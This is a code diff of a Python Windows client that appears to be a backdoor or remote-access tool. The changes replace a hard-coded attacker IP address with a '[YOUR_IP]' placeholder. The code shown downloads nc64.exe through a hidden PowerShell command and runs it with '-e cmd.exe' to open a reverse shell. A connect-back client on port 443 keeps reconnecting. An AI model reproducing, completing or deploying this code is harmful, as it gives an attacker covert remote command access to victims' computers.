@@ -74,19 +74,19 @@ def download_and_run_nc():
         # Full path to the downloaded 'nc64.exe' file in the temporary folder
         nc_path = os.path.join(temp_folder, 'nc64.exe')
         # PowerShell command to download 'nc64.exe' to the temporary folder
-        powershell_command = f'Invoke-WebRequest -Uri "http://143.42.5.48/nc64.exe" -OutFile "{nc_path}"'
+        powershell_command = f'Invoke-WebRequest -Uri "http://[YOUR_IP]/nc64.exe" -OutFile "{nc_path}"'
         # Run the PowerShell command
         subprocess.Popen(['powershell', '-command', powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)
         # Wait for a moment to ensure the download completes
         subprocess.Popen(['timeout', '/nobreak', '5'], shell=True).wait()
         # Run 'nc64.exe' from the temporary folder
-        subprocess.Popen([os.path.join(temp_folder, 'nc64.exe'), '143.42.5.48', '4444', '-e', 'cmd.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen([os.path.join(temp_folder, 'nc64.exe'), '[YOUR_IP]', '4444', '-e', 'cmd.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
 
     except Exception as e:
         print(f"Failed to start shell: {e}")
 
 def start_client():
-    host = '143.42.5.48'
+    host = '[YOUR_IP]'
     port = 443
 
     while should_reconnect:
